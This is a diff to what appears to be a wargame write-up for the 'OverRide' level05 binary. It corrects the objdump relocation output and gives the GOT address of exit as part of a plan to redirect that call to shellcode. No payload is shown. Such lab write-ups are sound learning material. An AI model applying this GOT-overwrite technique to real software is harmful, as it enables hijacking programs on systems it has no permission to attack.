@@ -16,18 +16,20 @@ Our strategy : overwrite the call of the `exit` function by the call of a shellc
 
 - Address of `exit` in the Global Table Offset (GOT) : 
 ```
-objdump -R level5
+level05@OverRide:~$ objdump -R level05 
+
+level05:     file format elf32-i386
+
 DYNAMIC RELOCATION RECORDS
 OFFSET   TYPE              VALUE 
-08049814 R_386_GLOB_DAT    __gmon_start__
-08049848 R_386_COPY        stdin
-08049824 R_386_JUMP_SLOT   printf
-08049828 R_386_JUMP_SLOT   _exit
-0804982c R_386_JUMP_SLOT   fgets
-08049830 R_386_JUMP_SLOT   system
-08049834 R_386_JUMP_SLOT   __gmon_start__
-08049838 R_386_JUMP_SLOT   exit
-0804983c R_386_JUMP_SLOT   __libc_start_main
+080497c4 R_386_GLOB_DAT    __gmon_start__
+080497f0 R_386_COPY        stdin
+080497d4 R_386_JUMP_SLOT   printf
+080497d8 R_386_JUMP_SLOT   fgets
+080497dc R_386_JUMP_SLOT   __gmon_start__
+080497e0 R_386_JUMP_SLOT   exit
+080497e4 R_386_JUMP_SLOT   __libc_start_main
+
 ```
 exit : 080497e0
 
